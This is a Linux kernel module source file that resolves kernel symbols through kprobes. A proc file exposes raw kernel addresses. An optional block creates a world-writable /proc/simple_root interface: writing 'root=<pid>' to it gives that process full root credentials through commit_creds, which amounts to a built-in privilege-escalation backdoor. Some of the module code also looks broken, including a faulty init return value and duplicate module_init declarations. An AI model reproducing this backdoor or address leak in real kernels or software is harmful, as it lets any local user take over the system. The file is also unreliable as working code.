// SPDX-License-Identifier: GPL-2.0-only
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/version.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/tracepoint.h>
#include <linux/alarmtimer.h>
#include <linux/ktime.h>
#include <linux/rbtree.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#if (LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0))
#include <linux/kallsyms.h>
#endif
#include "simple_lookup_name.h"

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0))
static unsigned long (*kallsyms_lookup_name_sym)(const char *name) = NULL;

static int _kallsyms_lookup_kprobe(struct kprobe *p, struct pt_regs *regs)
{
	return 0;
}

/*
 * get symbol of kallsyms_lookup_name() function
 */
static void *get_kallsyms_func(void)
{
	struct kprobe kp_kallsyms_lookup_name;
	void *kallsyms_lookup_name_addr;
	int ret;

	kp_kallsyms_lookup_name.pre_handler = _kallsyms_lookup_kprobe;
	kp_kallsyms_lookup_name.symbol_name = "kallsyms_lookup_name";

	ret = register_kprobe(&kp_kallsyms_lookup_name);
	if (ret < 0) {
		pr_info("register kallsyms_lookup_name failed with %d\n", ret);
		return 0;
	}

	kallsyms_lookup_name_addr = kp_kallsyms_lookup_name.addr;

	unregister_kprobe(&kp_kallsyms_lookup_name);
	return kallsyms_lookup_name_addr;
}

unsigned long simple_kallsyms_lookup_name(const char *name)
{
	if (!kallsyms_lookup_name_sym) {
		kallsyms_lookup_name_sym = (void *)get_kallsyms_func();
		if (!kallsyms_lookup_name_sym) {
			pr_info("kallsyms_lookup_name symbol get failed\n");
			return 0;
		}
	}

	return (unsigned long)kallsyms_lookup_name_sym(name);
}

#elif (LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0))
unsigned long simple_kallsyms_lookup_name(const char *name)
{
	struct kprobe kp;
	int *kp_addr;

	kp.symbol_name = name;
	register_kprobe(&kp);
	kp_addr = kp.addr;
	unregister_kprobe(&kp);

	return (unsigned long)kp_addr;
}

#else
unsigned long simple_kallsyms_lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif
EXPORT_SYMBOL(simple_kallsyms_lookup_name);

#if IS_ENABLED(CONFIG_SIMPLE_LOOKUP_NAME_PROC)
static char *lookup_results;

static ssize_t sln_write(struct file *filp, const char *ubuf, size_t cnt,
			 loff_t *data)
{
	char buf[KSYM_NAME_LEN];
	void *addr;

	if (cnt >= sizeof(buf))
		return -EINVAL;

	if (copy_from_user(&buf, ubuf, cnt))
		return -EFAULT;

	if (buf[cnt - 1] == '\n')
		buf[cnt - 1] = '\0';
	else
		buf[cnt] = '\0';

	addr = (void *)simple_kallsyms_lookup_name(buf);
	kfree(lookup_results);
	lookup_results = kasprintf(GFP_KERNEL, "[%px]%s\n", addr, buf);

	return cnt;
}

static int sln_show(struct seq_file *m, void *v)
{
	if (unlikely(lookup_results == NULL)) {
		seq_puts(m, "No lookup results\n");
		return 0;
	}

	seq_puts(m, lookup_results);
	return 0;
}

static int sln_open(struct inode *inode, struct file *file)
{
	return single_open(file, sln_show, inode->i_private);
}

static const struct proc_ops sln_fops = {
	.proc_open = sln_open,
	.proc_write = sln_write,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

static int __init sln_trace_init(void)
{
	proc_create("simple_lookup", 0660, NULL, &sln_fops);
	return 0;
}

static void __exit sln_trace_exit(void)
{
	remove_proc_entry("simple_lookup", NULL);
	kfree(lookup_results);
}

module_init(sln_trace_init);
module_exit(sln_trace_exit);
#endif /* CONFIG_SIMPLE_LOOKUP_NAME_PROC */

#if IS_ENABLED(CONFIG_SIMPLE_ROOT)
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/pid.h>

NGKI_DECLARE(NGKI_SYM(commit_creds));

static int become_root(pid_t nr)
{
	struct task_struct *target_task;
	struct cred *new_cred;
	struct pid *pid_struct;

	pid_struct = find_get_pid(nr);
	if (!pid_struct) {
		pr_err("cannot find PID=%d\n", nr);
		return -ESRCH;
	}

	target_task = pid_task(pid_struct, PIDTYPE_PID);
	if (!target_task) {
		pr_err("cannot find task for PID=%d\n", nr);
		put_pid(pid_struct);
		return -ESRCH;
	}

	pr_info("PID=%d original UID: %d, original EUID: %d\n", nr,
		target_task->cred->uid.val, target_task->cred->euid.val);

	new_cred = prepare_kernel_cred(target_task);
	if (!new_cred) {
		pr_err("cannot prepare new credentials for PID=%d\n", nr);
		put_pid(pid_struct);
		return -ENOMEM;
	}

	new_cred->uid = new_cred->euid = new_cred->suid = new_cred->fsuid =
		GLOBAL_ROOT_UID;
	new_cred->gid = new_cred->egid = new_cred->sgid = new_cred->fsgid =
		GLOBAL_ROOT_GID;

	NGKI_CALL(commit_creds, new_cred);

	pr_info("PID=%d modified to root user: UID=%d, EUID=%d\n", nr,
		target_task->cred->uid.val, target_task->cred->euid.val);

	put_pid(pid_struct);
	return 0;
}

static ssize_t simple_root_write(struct file *filp, const char *ubuf,
				 size_t cnt, loff_t *data)
{
	char buf[32];

	if (cnt >= sizeof(buf))
		return -EINVAL;

	if (copy_from_user(&buf, ubuf, cnt))
		return -EFAULT;

	if (strstr(buf, "root=") == buf) {
		pid_t nr = simple_strtol(buf + strlen("root="), NULL, 10);
		if (nr > 0) {
			int ret = become_root(nr);
			if (ret < 0)
				pr_err("Failed to become root for PID %d\n",
				       nr);
			else
				pr_info("Became root for PID %d\n", nr);
		} else {
			pr_err("Invalid PID: %s\n", &buf[4]);
		}
	}

	return cnt;
}

static int simple_root_show(struct seq_file *m, void *v)
{
	seq_puts(m, "---test---\n");

	return 0;
}

static int simple_root_open(struct inode *inode, struct file *file)
{
	return single_open(file, simple_root_show, inode->i_private);
}

static const struct proc_ops simple_root_fops = {
	.proc_open = simple_root_open,
	.proc_write = simple_root_write,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

static int __init simple_root_init(void)
{
	if (NGKI_GET_FUNC(commit_creds))
		return -ENOSYS;

	return PTR_ERR(
		proc_create("simple_root", 0666, NULL, &simple_root_fops));
}
module_init(simple_root_init);
#endif /* CONFIG_SIMPLE_ROOT */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Casey");
